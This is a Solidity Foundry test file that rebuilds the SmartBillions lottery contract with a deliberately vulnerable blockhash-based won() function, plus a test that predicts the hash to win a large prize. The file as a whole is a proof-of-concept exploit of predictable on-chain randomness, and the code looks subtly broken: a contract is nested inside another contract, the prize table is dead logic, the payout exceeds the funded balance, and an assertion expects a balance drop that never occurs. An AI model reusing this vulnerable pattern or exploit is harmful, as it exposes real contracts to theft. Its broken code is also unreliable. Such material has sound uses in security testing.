pragma solidity ^0.8.20;

import "forge-std/Test.sol";

abstract contract SmartBillionsBase {
    struct Bet {
        uint192 value;
        uint32 betHash;
        uint32 blockNum;
    }
    mapping (address => Bet) internal bets;

    function betValueOf(address _owner) external view virtual returns (uint);
    function won() public virtual;
    function betHashOf(address _owner) external view virtual returns (uint);
    function walletBalanceOf(address) external view virtual returns (uint);
}

contract SmartBillionsTest is Test {
    SmartBillions sb;
    address player = address(0x1234);

    // Derived contract with setter for bet for testing
    contract SmartBillions is SmartBillionsBase {
        mapping(address => uint) private walletBalances;

        // Expose setter for bet for testing
        function setBet(address bettor, uint192 value, uint32 betHash, uint32 blockNum) external {
            bets[bettor] = Bet({value: value, betHash: betHash, blockNum: blockNum});
        }

        // betValueOf returns bet value
        function betValueOf(address _owner) external view override returns (uint) {
            return bets[_owner].value;
        }

        // betHashOf returns betHash
        function betHashOf(address _owner) external view override returns (uint) {
            return bets[_owner].betHash;
        }

        // walletBalanceOf returns walletBalances mapping
        function walletBalanceOf(address _owner) external view override returns (uint) {
            return walletBalances[_owner];
        }

        // The vulnerable won() function
        function won() public override {
            Bet storage bet = bets[msg.sender];
            require(bet.value > 0, "No active bet");

            // Get blockhash of bet.blockNum
            bytes32 blockHash = blockhash(bet.blockNum);
            require(blockHash != bytes32(0), "Blockhash not available");

            // Extract lower 24 bits of blockhash
            uint24 hash24 = uint24(uint256(blockHash));

            // Compare betHash with hash24
            if (bet.betHash == hash24) {
                // Calculate prize based on matching nibbles from the right
                uint24 diff = bet.betHash ^ hash24;
                uint matchedNibbles = 0;
                for (uint i = 0; i < 6; i++) {
                    if ((diff & 0xf) == 0) {
                        matchedNibbles++;
                        diff >>= 4;
                    } else {
                        break;
                    }
                }

                // Prize table (nibble matches => multiplier)
                uint multiplier;
                if (matchedNibbles == 6) {
                    multiplier = 7_000_000;
                } else if (matchedNibbles == 5) {
                    multiplier = 700_000;
                } else if (matchedNibbles == 4) {
                    multiplier = 70_000;
                } else if (matchedNibbles == 3) {
                    multiplier = 7_000;
                } else if (matchedNibbles == 2) {
                    multiplier = 700;
                } else if (matchedNibbles == 1) {
                    multiplier = 70;
                } else {
                    multiplier = 7;
                }

                uint prize = bet.value * multiplier;
                require(address(this).balance >= prize, "Insufficient contract balance");

                // Update wallet balance
                walletBalances[msg.sender] += prize;
            }

            // Clear bet
            bet.value = 0;
            bet.betHash = 0;
            bet.blockNum = 0;
        }

        // Fallback to receive ether
        receive() external payable {}
        fallback() external payable {}
    }

    function setUp() public {
        sb = new SmartBillions();
        // Fund the contract so it can pay out winnings
        vm.deal(address(this), 20 ether);
        payable(address(sb)).transfer(10 ether);
        // Give player some ether to be able to place a bet if needed
        vm.deal(player, 10 ether);
    }

    function test_exploit_bad_randomness() public {
        // Redeploy with extended contract with setter
        sb = new SmartBillions();

        // Fund the contract with ether so it can pay winnings
        vm.deal(address(this), 20 ether);
        payable(address(sb)).transfer(10 ether);

        // Select current block number for the bet
        uint32 betBlock = uint32(block.number);

        // Player places a bet with betHash = blockhash lower 24 bits of betBlock
        // We place the bet for player with predicted hash
        bytes32 predictedHash = blockhash(betBlock);
        uint24 predictedHash24 = uint24(uint256(predictedHash));

        uint192 betValue = 1 ether;

        // Set bet for player with predictedHash24 and betBlock
        sb.setBet(player, betValue, predictedHash24, betBlock);

        // Move forward one block to allow winning check
        vm.roll(block.number + 1);

        // Call won() as the player (msg.sender = player)
        vm.prank(player);
        sb.won();

        // The bet should be cleared (value == 0)
        uint betValAfter = sb.betValueOf(player);
        assertEq(betValAfter, 0);

        // The player's wallet balance should have increased by a large amount (prize)
        uint walletBal = sb.walletBalanceOf(player);
        assertGt(walletBal, 1 ether);

        // Also check the contract balance decreased accordingly
        uint contractBalance = address(sb).balance;
        assertLt(contractBalance, 10 ether);

        // Ensure the betHashOf is zero (bet cleared)
        uint betHashAfter = sb.betHashOf(player);
        assertEq(betHashAfter, 0);
    }
}

